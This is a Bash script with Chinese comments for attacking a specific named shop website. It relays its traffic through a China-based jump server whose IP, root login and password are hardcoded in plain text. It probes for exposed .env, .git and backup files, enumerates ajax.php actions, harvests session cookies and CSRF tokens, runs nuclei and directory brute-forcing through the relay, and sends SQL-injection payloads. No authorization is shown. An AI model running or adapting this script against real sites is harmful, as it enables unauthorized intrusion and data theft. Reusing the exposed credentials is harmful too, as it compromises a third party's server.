#!/bin/bash
# 香港工具 + 国内跳板 深度探测脚本
# 流量路径: HK工具 -> SSH隧道/远程curl -> CN跳板 -> 目标
set -uo pipefail

export PATH="/data/venvs/pentest/bin:/data/automation/bin:/data/tools:/data/go/bin:/usr/local/bin:/usr/bin:$PATH"

# 跳板配置
JP_HOST="42.240.167.114"
JP_USER="root"
JP_PASS="DX4LmrDaPfd9"
TARGET="${1:-KLN166.top}"
SHOP="https://${TARGET}/shop/"
BASE="https://${TARGET}/shop"
OUT="/data/automation/results/${TARGET}/deep_jp_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"

log(){ echo "[$(date +%H:%M:%S)] $*"; }

# SSH 到跳板执行命令
jp_exec(){
  sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 \
    "${JP_USER}@${JP_HOST}" "$@" 2>/dev/null
}

# CN 端 curl 包装：优先走青果代理
JP_CURL_WRAP='source /data/config/proxy.env 2>/dev/null; PX=""; [ -n "${PROXY_URL:-}" ] && PX="-x $PROXY_URL"'

# 通过跳板 curl（CN 出口 + 青果代理）
jp_curl(){
  local url="$1"
  local extra="${2:-}"
  jp_exec "${JP_CURL_WRAP}; curl -sk --max-time 20 \$PX $extra '$url'"
}

# 通过跳板获取状态码
jp_code(){
  local url="$1"
  jp_exec "${JP_CURL_WRAP}; curl -sk -o /dev/null -w '%{http_code}' --max-time 12 \$PX '$url'"
}

log "===== HK工具+CN跳板 深入探测: $TARGET ====="
log "输出: $OUT"

# 0. 连通性测试
log "[0] 连通性"
HK_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "$SHOP" 2>/dev/null || echo "000")
JP_CODE=$(jp_code "$SHOP")
log "HK直连: $HK_CODE | CN跳板: $JP_CODE"
echo "hk=$HK_CODE jp=$JP_CODE" > "$OUT/connectivity.txt"

USE_JP=true
[ "$JP_CODE" = "200" ] || [ "$JP_CODE" = "301" ] || [ "$JP_CODE" = "302" ] || [ "$JP_CODE" = "403" ] && USE_JP=true
[ "$HK_CODE" = "200" ] && USE_JP=false

fetch(){
  local url="$1" outfile="$2"
  if $USE_JP; then
    jp_curl "$url" > "$outfile"
  else
    curl -sk --max-time 20 "$url" -o "$outfile"
  fi
}

get_code(){
  local url="$1"
  if $USE_JP; then jp_code "$url"; else curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "$url" 2>/dev/null; fi
}

# 1. 页面抓取
log "[1] 页面抓取 (via $([ "$USE_JP" = true ] && echo CN跳板 || echo HK直连))"
fetch "$SHOP" "$OUT/shop.html"
echo "size: $(wc -c < "$OUT/shop.html" 2>/dev/null || echo 0)" | tee "$OUT/page_info.txt"
grep -oiE '<title>[^<]+' "$OUT/shop.html" 2>/dev/null | tee -a "$OUT/page_info.txt"

# 2. 敏感路径
log "[2] 敏感路径探测"
paths=".env .git .git/HEAD .git/config backup.sql config.php ajax.php api.php toollogs.php user/login.php user/reg.php user/ajax_chat.php admin/ pay/ order/ upload/ install.php phpinfo.php"
for p in $paths; do
  url="${BASE}/${p}"
  code=$(get_code "$url")
  echo "$code $url" | tee -a "$OUT/sensitive_paths.txt"
done

# 3. ajax.php act 枚举（CSRF白名单动作）
log "[3] ajax.php act 枚举"
acts="getcount getclass gettool gettoolnew getleftcount checklogin query order cart_info cart_list captcha gift_start getshareid pay buy login reg upload admin info list"
for act in $acts; do
  resp=$(jp_curl "${BASE}/ajax.php?act=${act}" 2>/dev/null | head -c 200)
  [ -n "$resp" ] && echo "[$act] $resp" | tee -a "$OUT/ajax_enum.txt"
done

# 4. 带Cookie探测ajax（先拿session）
log "[4] 带Session探测"
jp_exec "${JP_CURL_WRAP}; curl -sk \$PX -c /tmp/kln_ck.txt --max-time 15 '$SHOP' -o /dev/null; \
  for act in query order cart_info checklogin gettool getcount; do \
    r=\$(curl -sk \$PX -b /tmp/kln_ck.txt --max-time 8 '${BASE}/ajax.php?act='\$act 2>/dev/null | head -c 300); \
    echo \"[session:\$act] \$r\"; \
  done" | tee "$OUT/ajax_session.txt"

# 5. CSRF token 提取
log "[5] CSRF/隐藏字段"
grep -oiE 'csrf_token\s*=\s*["\x27][^"\x27]+|name="csrf_token"[^>]+|var csrf[^;]+' "$OUT/shop.html" 2>/dev/null | tee "$OUT/csrf.txt"
grep -oiE '<input[^>]+type="hidden"[^>]+>' "$OUT/shop.html" 2>/dev/null | head -10 | tee -a "$OUT/csrf.txt"

# 6. PHP端点提取
log "[6] 端点提取"
grep -oiE 'href="[^"]+\.php[^"]*"' "$OUT/shop.html" 2>/dev/null | sort -u | tee "$OUT/endpoints.txt"
grep -oiE "[a-zA-Z0-9_/.-]+\.php" "$OUT/shop.html" 2>/dev/null | sort -u | head -30 | tee -a "$OUT/endpoints.txt"

# 7. toollogs.php 内容
log "[7] toollogs.php"
fetch "${BASE}/toollogs.php" "$OUT/toollogs.html"
head -c 1000 "$OUT/toollogs.html" 2>/dev/null | tee "$OUT/toollogs_preview.txt"

# 8. user/login.php
log "[8] 登录/注册页"
fetch "${BASE}/user/login.php" "$OUT/login.html"
fetch "${BASE}/user/reg.php" "$OUT/reg.html"
grep -oiE '<form[^>]+>|action="[^"]+"|name="[^"]+"' "$OUT/login.html" 2>/dev/null | head -15 | tee "$OUT/login_forms.txt"

# 9. nuclei via 跳板 (在CN跑nuclei如果HK有)
log "[9] nuclei (HK工具经跳板HTTP)"
if $USE_JP; then
  # HK nuclei 无法走SSH，在跳板机跑nuclei
  jp_exec "export PATH=/data/tools:/usr/local/bin:\$PATH; timeout 90 nuclei -u '$SHOP' -severity critical,high,medium -silent 2>/dev/null" | tee "$OUT/nuclei.txt"
else
  timeout 90 nuclei -u "$SHOP" -severity critical,high,medium -silent 2>/dev/null | tee "$OUT/nuclei.txt"
fi

# 10. IDOR/SQLi 快速测试 query
log "[10] 注入快速测试"
for payload in "1" "1'" "1 OR 1=1" "-1" "99999999"; do
  r=$(jp_exec "${JP_CURL_WRAP}; curl -sk \$PX -b /tmp/kln_ck.txt --max-time 8 '${BASE}/ajax.php?act=query&id=${payload}' 2>/dev/null | head -c 150")
  echo "query id=$payload: $r" | tee -a "$OUT/injection.txt"
done

# 11. feroxbuster 在HK跑（如果HK通）否则CN
log "[11] 目录爆破"
if [ "$HK_CODE" = "200" ]; then
  timeout 90 feroxbuster -u "$SHOP" -w /data/wordlists/common.txt -q -n -t 25 -d 1 -T 45 -o "$OUT/ferox.txt" 2>/dev/null
else
  jp_exec "export PATH=/data/tools:/usr/bin:\$PATH; timeout 90 feroxbuster -u '$SHOP' -w /data/wordlists/common.txt -q -n -t 25 -d 1 -T 45 2>/dev/null" | head -30 | tee "$OUT/ferox.txt"
fi

# 12. 生成摘要
log "[12] 生成摘要"
cat > "$OUT/summary.md" << SUM
# 深入探测报告: $TARGET
- 时间: $(date '+%Y-%m-%d %H:%M:%S')
- 路径: HK工具 + CN跳板($JP_HOST)
- HK直连: $HK_CODE | CN跳板: $JP_CODE

## 敏感路径
$(cat "$OUT/sensitive_paths.txt" 2>/dev/null | grep -v "^404" | head -20)

## ajax响应
$(head -15 "$OUT/ajax_enum.txt" 2>/dev/null)

## Session ajax
$(head -10 "$OUT/ajax_session.txt" 2>/dev/null)

## Nuclei
$(cat "$OUT/nuclei.txt" 2>/dev/null || echo "无")

## 注入测试
$(cat "$OUT/injection.txt" 2>/dev/null)
SUM

log "===== 完成: $OUT ====="
cat "$OUT/summary.md"
